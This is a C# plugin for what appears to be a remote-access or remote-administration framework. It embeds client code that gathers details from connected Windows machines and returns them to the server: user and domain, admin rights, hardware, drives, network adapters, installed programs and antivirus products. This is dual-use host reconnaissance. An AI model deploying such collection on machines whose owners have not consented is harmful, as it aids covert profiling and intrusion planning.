// File: SystemInfoPlugin.cs
#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using WpfApp.Plugins;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class SystemInfoPlugin : IServerPlugin, IMultiClientPlugin
    {
        private PluginHost _host;
        private SystemInfoUI _sharedUI;
        private readonly object _uiLock = new();
        private readonly ConcurrentDictionary<string, PluginContext> _managedClients = new();

        public string PluginId => "sysinfo";
        public string DisplayName => "System Info";
        public string Version => "1.0.0";
        public string Description => "Gather detailed system information from remote clients including OS, hardware, storage, network, software and security status.";

        private const byte OP_REQUEST_INFO = 0x01;
        private const byte CLIENT_READY = 0xFE;
        private const byte CLIENT_INFO = 0x02;

        public Task Initialize(PluginHost host)
        {
            _host = host;
            _host.Log("[SYSINFO] Plugin initialized v1.0");
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            lock (_uiLock) { _sharedUI?.Dispose(); _sharedUI = null; }
            _managedClients.Clear();
            return Task.CompletedTask;
        }

        public UserControl CreateSharedUI()
        {
            lock (_uiLock)
            {
                if (_sharedUI != null)
                    return _sharedUI;

                _sharedUI = new SystemInfoUI(this);

                foreach (var cid in _managedClients.Keys)
                    _sharedUI.OnClientAdded(cid);

                return _sharedUI;
            }
        }

        public void AddClient(string clientId, PluginContext context)
        {
            _managedClients[clientId] = context;
            lock (_uiLock) { _sharedUI?.OnClientAdded(clientId); }
        }

        public void RemoveClient(string clientId)
        {
            _managedClients.TryRemove(clientId, out _);
            lock (_uiLock) { _sharedUI?.OnClientRemoved(clientId); }
        }

        public void RemoveAllClients()
        {
            var ids = _managedClients.Keys.ToList();
            foreach (var id in ids) RemoveClient(id);
        }

        public List<string> GetManagedClientIds() => _managedClients.Keys.ToList();

        public UserControl CreateUI(PluginContext context)
        {
            AddClient(context.ClientId, context);
            return CreateSharedUI();
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;
            SystemInfoUI ui;
            lock (_uiLock) { ui = _sharedUI; }
            if (ui == null) return Task.CompletedTask;

            byte ind = data[0];
            byte[] payload = data.Length > 1 ? data.AsSpan(1).ToArray() : Array.Empty<byte>();

            switch (ind)
            {
                case CLIENT_READY:
                    _host.Log("[SYSINFO] " + clientId + " ready");
                    break;
                case CLIENT_INFO:
                    ui.OnSystemInfoReceived(clientId, payload);
                    break;
            }
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            RemoveClient(clientId);
            return Task.CompletedTask;
        }

        public void RequestInfo(string cid) => Send(cid, OP_REQUEST_INFO, null);

        private void Send(string cid, byte op, byte[] payload)
        {
            int len = payload?.Length ?? 0;
            byte[] data = new byte[1 + len];
            data[0] = op;
            if (payload != null) Buffer.BlockCopy(payload, 0, data, 1, len);
            _host.SendPluginDataToClient(cid, PluginId, data);
        }

        public void Dispose()
        {
            lock (_uiLock) { _sharedUI?.Dispose(); _sharedUI = null; }
            _managedClients.Clear();
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace ClientPlugin_sysinfo
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private Func<Task<byte[]>> _receive;
        private CancellationTokenSource _cts = new CancellationTokenSource();

        public async Task Run(Func<byte[], Task> send, Func<Task<byte[]>> receive)
        {
            _send = send;
            _receive = receive;

            await _send(new byte[] { 0xFE });

            try
            {
                while (!_cts.IsCancellationRequested)
                {
                    byte[] data = await _receive();
                    if (data == null || data.Length == 0) break;

                    byte opcode = data[0];

                    if (opcode == 0x01)
                    {
                        string info = GatherSystemInfo();
                        byte[] infoBytes = Encoding.UTF8.GetBytes(info);
                        byte[] response = new byte[1 + infoBytes.Length];
                        response[0] = 0x02;
                        Buffer.BlockCopy(infoBytes, 0, response, 1, infoBytes.Length);
                        await _send(response);
                    }
                }
            }
            catch { }
        }

        private string GatherSystemInfo()
        {
            List<string> lines = new List<string>();

            try { lines.Add(""ComputerName="" + Environment.MachineName); } catch { }
            try { lines.Add(""UserName="" + Environment.UserName); } catch { }
            try { lines.Add(""UserDomain="" + Environment.UserDomainName); } catch { }
            try { lines.Add(""Is64Bit="" + (Environment.Is64BitOperatingSystem ? ""Yes"" : ""No"")); } catch { }
            try { lines.Add(""ProcessorCount="" + Environment.ProcessorCount); } catch { }
            try { lines.Add(""SystemDirectory="" + Environment.SystemDirectory); } catch { }
            try { lines.Add(""CLRVersion="" + Environment.Version); } catch { }

            // OS version - use RtlGetVersion to get real version
            try
            {
                RTL_OSVERSIONINFOEX osvi = new RTL_OSVERSIONINFOEX();
                osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(typeof(RTL_OSVERSIONINFOEX));
                if (RtlGetVersion(out osvi) == 0)
                {
                    lines.Add(""OSVersion="" + osvi.dwMajorVersion + ""."" + osvi.dwMinorVersion + ""."" + osvi.dwBuildNumber);
                    string edition = GetOSEdition(osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
                    lines.Add(""OSEdition="" + edition);
                }
            }
            catch { }

            // Uptime
            try
            {
                TimeSpan uptime = TimeSpan.FromMilliseconds(Environment.TickCount & int.MaxValue);
                lines.Add(""Uptime="" + (int)uptime.TotalDays + ""d "" + uptime.Hours + ""h "" + uptime.Minutes + ""m"");
            }
            catch { }

            // Admin status
            try
            {
                bool isAdmin = new System.Security.Principal.WindowsPrincipal(
                    System.Security.Principal.WindowsIdentity.GetCurrent())
                    .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                lines.Add(""IsAdmin="" + (isAdmin ? ""Yes"" : ""No""));
            }
            catch { }

            // .NET version
            try { lines.Add(""DotNetVersion="" + GetDotNetVersion()); } catch { }

            // System locale
            try
            {
                lines.Add(""SystemLocale="" + CultureInfo.InstalledUICulture.DisplayName);
                lines.Add(""InputLocale="" + CultureInfo.CurrentCulture.DisplayName);
            }
            catch { }

            // Time zone
            try { lines.Add(""TimeZone="" + TimeZoneInfo.Local.DisplayName); } catch { }

            // WMI-based info
            try { CollectWmiInfo(lines); } catch { }

            // Storage
            try { CollectStorageInfo(lines); } catch { }

            // Network
            try { CollectNetworkInfo(lines); } catch { }

            // Installed programs
            try { CollectInstalledPrograms(lines); } catch { }

            // Antivirus
            try { CollectAntivirusInfo(lines); } catch { }

            return string.Join(""\n"", lines.ToArray());
        }

        [DllImport(""ntdll.dll"", SetLastError = true)]
        private static extern int RtlGetVersion(out RTL_OSVERSIONINFOEX lpVersionInformation);

        [StructLayout(LayoutKind.Sequential)]
        private struct RTL_OSVERSIONINFOEX
        {
            public uint dwOSVersionInfoSize;
            public uint dwMajorVersion;
            public uint dwMinorVersion;
            public uint dwBuildNumber;
            public uint dwPlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string szCSDVersion;
            public ushort wServicePackMajor;
            public ushort wServicePackMinor;
            public ushort wSuiteMask;
            public byte wProductType;
            public byte wReserved;
        }

        private string GetOSEdition(uint major, uint minor, uint build)
        {
            if (major == 10 && build >= 22000) return ""Windows 11"";
            if (major == 10 && build >= 10240) return ""Windows 10"";
            if (major == 6 && minor == 3) return ""Windows 8.1"";
            if (major == 6 && minor == 2) return ""Windows 8"";
            if (major == 6 && minor == 1) return ""Windows 7"";
            if (major == 6 && minor == 0) return ""Windows Vista"";
            if (major == 5 && minor == 2) return ""Windows Server 2003/XP 64"";
            if (major == 5 && minor == 1) return ""Windows XP"";
            return ""Windows "" + major + ""."" + minor;
        }

        private void CollectWmiInfo(List<string> lines)
        {
            try
            {
                System.Management.ManagementObjectSearcher searcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT * FROM Win32_OperatingSystem"");
                foreach (System.Management.ManagementObject obj in searcher.Get())
                {
                    try
                    {
                        string caption = obj[""Caption""] != null ? obj[""Caption""].ToString().Trim() : """";
                        if (!string.IsNullOrEmpty(caption))
                            lines.Add(""OSName="" + caption);
                    }
                    catch { }
                    try
                    {
                        string installDate = obj[""InstallDate""] != null ? obj[""InstallDate""].ToString() : """";
                        if (installDate.Length >= 8)
                        {
                            try
                            {
                                string d = installDate.Substring(0, 4) + ""-"" + installDate.Substring(4, 2) + ""-"" + installDate.Substring(6, 2);
                                lines.Add(""OSInstallDate="" + d);
                            }
                            catch { }
                        }
                    }
                    catch { }
                    try
                    {
                        object freeMem = obj[""FreePhysicalMemory""];
                        if (freeMem != null)
                        {
                            double gb = double.Parse(freeMem.ToString()) / 1024.0 / 1024.0;
                            lines.Add(""RAMFree="" + gb.ToString(""F1"") + "" GB"");
                        }
                    }
                    catch { }
                    try
                    {
                        object totalVisMem = obj[""TotalVisibleMemorySize""];
                        if (totalVisMem != null)
                        {
                            double mb = double.Parse(totalVisMem.ToString()) / 1024.0 / 1024.0;
                            lines.Add(""RAMTotal="" + mb.ToString(""F1"") + "" GB"");
                        }
                    }
                    catch { }
                    obj.Dispose();
                }
                searcher.Dispose();
            }
            catch { }

            // CPU
            try
            {
                System.Management.ManagementObjectSearcher cpuSearcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed FROM Win32_Processor"");
                int cpuIdx = 0;
                foreach (System.Management.ManagementObject obj in cpuSearcher.Get())
                {
                    string name = obj[""Name""] != null ? obj[""Name""].ToString().Trim() : """";
                    string cores = obj[""NumberOfCores""] != null ? obj[""NumberOfCores""].ToString() : ""?"";
                    string threads = obj[""NumberOfLogicalProcessors""] != null ? obj[""NumberOfLogicalProcessors""].ToString() : ""?"";
                    string speed = obj[""MaxClockSpeed""] != null ? obj[""MaxClockSpeed""].ToString() : """";
                    if (cpuIdx == 0)
                    {
                        lines.Add(""CPUName="" + name);
                        lines.Add(""CPUCores="" + cores + ""C/"" + threads + ""T"");
                        if (!string.IsNullOrEmpty(speed))
                            lines.Add(""CPUSpeed="" + speed + "" MHz"");
                    }
                    cpuIdx++;
                    obj.Dispose();
                }
                cpuSearcher.Dispose();
            }
            catch { }

            // GPU
            try
            {
                System.Management.ManagementObjectSearcher gpuSearcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT Name, DriverVersion, AdapterRAM FROM Win32_VideoController"");
                int gpuIdx = 0;
                foreach (System.Management.ManagementObject obj in gpuSearcher.Get())
                {
                    string name = obj[""Name""] != null ? obj[""Name""].ToString().Trim() : """";
                    if (gpuIdx == 0)
                    {
                        lines.Add(""GPUName="" + name);
                        string drv = obj[""DriverVersion""] != null ? obj[""DriverVersion""].ToString() : """";
                        if (!string.IsNullOrEmpty(drv))
                            lines.Add(""GPUDriver="" + drv);
                        object ramObj = obj[""AdapterRAM""];
                        if (ramObj != null)
                        {
                            long ramBytes = Convert.ToInt64(ramObj);
                            if (ramBytes > 0)
                                lines.Add(""GPUVRAM="" + (ramBytes / 1024.0 / 1024.0 / 1024.0).ToString(""F1"") + "" GB"");
                        }
                    }
                    gpuIdx++;
                    obj.Dispose();
                }
                gpuSearcher.Dispose();
            }
            catch { }

            // Motherboard
            try
            {
                System.Management.ManagementObjectSearcher mbSearcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT Manufacturer, Product, SerialNumber FROM Win32_BaseBoard"");
                foreach (System.Management.ManagementObject obj in mbSearcher.Get())
                {
                    string mfr = obj[""Manufacturer""] != null ? obj[""Manufacturer""].ToString().Trim() : """";
                    string prod = obj[""Product""] != null ? obj[""Product""].ToString().Trim() : """";
                    if (!string.IsNullOrEmpty(mfr) || !string.IsNullOrEmpty(prod))
                        lines.Add(""Motherboard="" + mfr + "" "" + prod);
                    obj.Dispose();
                }
                mbSearcher.Dispose();
            }
            catch { }

            // BIOS
            try
            {
                System.Management.ManagementObjectSearcher biosSearcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT SMBIOSBIOSVersion, ReleaseDate FROM Win32_BIOS"");
                foreach (System.Management.ManagementObject obj in biosSearcher.Get())
                {
                    string ver = obj[""SMBIOSBIOSVersion""] != null ? obj[""SMBIOSBIOSVersion""].ToString().Trim() : """";
                    if (!string.IsNullOrEmpty(ver))
                        lines.Add(""BIOSVersion="" + ver);
                    obj.Dispose();
                }
                biosSearcher.Dispose();
            }
            catch { }

            // Total physical RAM from Win32_ComputerSystem
            try
            {
                System.Management.ManagementObjectSearcher csSearcher = new System.Management.ManagementObjectSearcher(
                    ""SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"");
                foreach (System.Management.ManagementObject obj in csSearcher.Get())
                {
                    object mem = obj[""TotalPhysicalMemory""];
                    if (mem != null)
                    {
                        double gb = Convert.ToDouble(mem) / 1024.0 / 1024.0 / 1024.0;
                        lines.Add(""PhysicalRAM="" + gb.ToString(""F1"") + "" GB"");
                    }
                    obj.Dispose();
                }
                csSearcher.Dispose();
            }
            catch { }
        }

        private void CollectStorageInfo(List<string> lines)
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            int count = 0;
            foreach (DriveInfo d in drives)
            {
                try
                {
                    if (!d.IsReady) continue;
                    string label = !string.IsNullOrEmpty(d.VolumeLabel) ? d.VolumeLabel : """";
                    string format = d.DriveFormat;
                    long totalGB = d.TotalSize / 1024 / 1024 / 1024;
                    long freeGB = d.AvailableFreeSpace / 1024 / 1024 / 1024;
                    string type = d.DriveType.ToString();
                    lines.Add(""DRIVE|"" + d.Name.TrimEnd('\\') + ""|"" + label + ""|"" + totalGB + "" GB|"" + freeGB + "" GB|"" + format + ""|"" + type);
                    count++;
                }
                catch { }
            }
            lines.Add(""DriveCount="" + count);
        }

        private void CollectNetworkInfo(List<string> lines)
        {
            int count = 0;
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                try
                {
                    if (ni.OperationalStatus != OperationalStatus.Up) continue;
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;

                    IPInterfaceProperties props = ni.GetIPProperties();
                    UnicastIPAddressInformationCollection addrs = props.UnicastAddresses;

                    string ips = """";
                    foreach (UnicastIPAddressInformation addr in addrs)
                    {
                        if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            if (ips.Length > 0) ips += "","";
                            ips += addr.Address.ToString();
                        }
                    }
                    if (string.IsNullOrEmpty(ips)) continue;

                    string mac = ni.GetPhysicalAddress().ToString();
                    if (mac.Length > 0)
                    {
                        mac = string.Join("":"", Enumerable.Range(0, mac.Length / 2)
                            .Select(i => mac.Substring(i * 2, 2)));
                    }

                    string dns = """";
                    foreach (IPAddress dnsAddr in props.DnsAddresses)
                    {
                        if (dns.Length > 0) dns += "","";
                        dns += dnsAddr.ToString();
                    }

                    lines.Add(""NET|"" + ni.Name + ""|"" + ips + ""|"" + mac + ""|"" + dns);
                    count++;
                }
                catch { }
            }
            lines.Add(""NetAdapterCount="" + count);
        }

        private void CollectInstalledPrograms(List<string> lines)
        {
            List<string> programs = new List<string>();
            string[] registryPaths = new string[]
            {
                @""SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"",
                @""SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall""
            };

            foreach (string regPath in registryPaths)
            {
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, false))
                    {
                        if (key == null) continue;
                        foreach (string subKeyName in key.GetSubKeyNames())
                        {
                            try
                            {
                                using (RegistryKey subKey = key.OpenSubKey(subKeyName, false))
                                {
                                    if (subKey == null) continue;
                                    object nameObj = subKey.GetValue(""DisplayName"");
                                    if (nameObj == null) continue;
                                    string name = nameObj.ToString().Trim();
                                    if (string.IsNullOrEmpty(name)) continue;
                                    object verObj = subKey.GetValue(""DisplayVersion"");
                                    string ver = verObj != null ? verObj.ToString().Trim() : """";
                                    if (programs.Count < 300)
                                        programs.Add(name + (ver.Length > 0 ? "" ("" + ver + "")"" : """"));
                                }
                            }
                            catch { }
                        }
                    }
                }
                catch { }
            }

            lines.Add(""InstalledProgramCount="" + programs.Count);
            foreach (string prog in programs)
                lines.Add(""PROG|"" + prog);
        }

        private void CollectAntivirusInfo(List<string> lines)
        {
            try
            {
                System.Management.ManagementObjectSearcher searcher = new System.Management.ManagementObjectSearcher(
                    @""\\"" + Environment.MachineName + @""\root\SecurityCenter2"",
                    ""SELECT * FROM AntivirusProduct"");
                List<string> avs = new List<string>();
                foreach (System.Management.ManagementObject obj in searcher.Get())
                {
                    object nameObj = obj[""displayName""];
                    if (nameObj != null)
                    {
                        string name = nameObj.ToString().Trim();
                        if (!string.IsNullOrEmpty(name))
                            avs.Add(name);
                    }
                    obj.Dispose();
                }
                searcher.Dispose();
                    if (avs.Count > 0)
                    lines.Add(""Antivirus="" + string.Join("", "", avs.ToArray()));
                else
                    lines.Add(""Antivirus=None detected"");
            }
            catch
            {
                lines.Add(""Antivirus=Unable to query"");
            }
        }

        private string GetDotNetVersion()
        {
            try
            {
                using (RegistryKey ndpKey = Registry.LocalMachine.OpenSubKey(
                    @""SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"", false))
                {
                    if (ndpKey == null) return ""Not installed"";
                    object relObj = ndpKey.GetValue(""Release"");
                    if (relObj == null) return ""4.0+"";
                    int release = (int)relObj;
                    if (release >= 533320) return ""4.8.1"";
                    if (release >= 528040) return ""4.8"";
                    if (release >= 461808) return ""4.7.2"";
                    if (release >= 461308) return ""4.7.1"";
                    if (release >= 460798) return ""4.7"";
                    if (release >= 394802) return ""4.6.2"";
                    if (release >= 394254) return ""4.6.1"";
                    if (release >= 393295) return ""4.6"";
                    if (release >= 379893) return ""4.5.2"";
                    if (release >= 378675) return ""4.5.1"";
                    if (release >= 378389) return ""4.5"";
                    return ""4.0+"";
                }
            }
            catch { return ""Unknown""; }
        }
    }
}";
        }
    }

}
